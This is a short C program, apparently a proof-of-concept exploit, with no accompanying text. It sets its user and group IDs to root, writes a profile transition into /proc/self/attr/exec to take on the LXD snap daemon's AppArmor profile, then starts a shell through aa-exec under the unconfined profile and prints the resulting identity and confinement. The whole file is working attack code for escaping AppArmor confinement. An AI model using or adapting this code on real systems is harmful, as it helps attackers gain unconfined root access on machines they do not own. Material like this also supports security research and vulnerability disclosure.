
  #include <sys/types.h>
  #include <unistd.h>
  #include <stdio.h>

  int main(void) {
      if (setuid(0)) _exit(__LINE__);
      if (setgid(0)) _exit(__LINE__);

      FILE * const fp = fopen("/proc/self/attr/exec", "w");
      if (!fp) _exit(__LINE__);
      if (fputs("exec snap.lxd.daemon", fp) < 0) _exit(__LINE__);
      if (fclose(fp)) _exit(__LINE__);

      char * const argv[] = { "/bin/bash", "-c", "exec aa-exec -p unconfined -- "
          "/bin/bash -c 'id; cat /proc/self/attr/current'", NULL };
      execve(*argv, argv, NULL);
      _exit(__LINE__);
  }
